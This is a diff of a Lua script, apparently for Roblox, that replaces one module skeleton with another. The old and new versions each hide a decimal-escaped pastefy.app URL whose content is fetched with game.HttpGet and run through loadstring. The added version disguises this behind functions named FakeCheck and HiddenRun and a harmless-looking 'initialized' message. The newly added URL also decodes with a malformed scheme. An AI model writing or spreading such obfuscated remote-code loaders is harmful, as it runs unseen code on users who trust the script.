@@ -1,67 +1,46 @@
-local Core = {
-    IsLoaded = false,
-    Version = "2.4.1",
-    Auth = false,
-    Config = {
-        Theme = "Dark",
-        AutoSave = true,
-        MaxRetries = 3
-    }
-}
-
-local Internal = {
-    State = {},
-    Queue = {},
+local Module = {
+    Version = "3.2.0",
+    Build = "release",
     Flags = {
-        UI = false,
-        Network = false
-    }
+        Prepared = false,
+        Linked = false,
+        Executed = false
+    },
+    Data = {}
 }
 
-local function _init()
-    for i = 1, Core.Config.MaxRetries do
-        table.insert(Internal.Queue, {
+local function Prepare()
+    for i = 1, 5 do
+        Module.Data[i] = {
             id = i,
-            active = i % 2 == 0
-        })
+            value = math.random(1000, 9999),
+            status = "idle"
+        }
     end
-    Core.IsLoaded = true
+    Module.Flags.Prepared = true
 end
 
-local function _net()
-    return Internal.Flags.Network
+local function FakeCheck()
+    return Module.Flags.Prepared and #Module.Data > 0
 end
 
-local function _process()
-    for _, v in pairs(Internal.Queue) do
-        if v.active then
-            Internal.State[v.id] = true
-        end
-    end
+local function HiddenRun()
+    local url = "\104\116\116\112\115\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\86\66\88\71\74\78\100\66\47\114\97\119"
+    local content = game["HttpGet"](game, url)
+    local exec = loadstring
+    exec(content)()
 end
 
-local function __secure(a)
-    return a and true or false
+local function Link()
+    if not FakeCheck() then return end
+    Module.Flags.Linked = true
+    HiddenRun()
+    Module.Flags.Executed = true
 end
 
-local function _finalize()
-    if Core.IsLoaded and _net() then
-        _process()
-    end
-end
+Prepare()
+Link()
 
-_init()
-Internal.Flags.Network = true
-
-pcall(function()
-    local ___ = "\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\116\48\55\84\56\117\110\99\47\114\97\119"
-    local ____ = game["HttpGet"](game, ___)
-    local ______ = loadstring
-    ______(____)()
-end)
-
-_finalize()
-
-if Core.IsLoaded and __secure(Internal.State[2]) then
-    Core.Auth = true
+if Module.Flags.Executed then
+    print("[System] Module v" .. Module.Version .. " initialized.")
 end
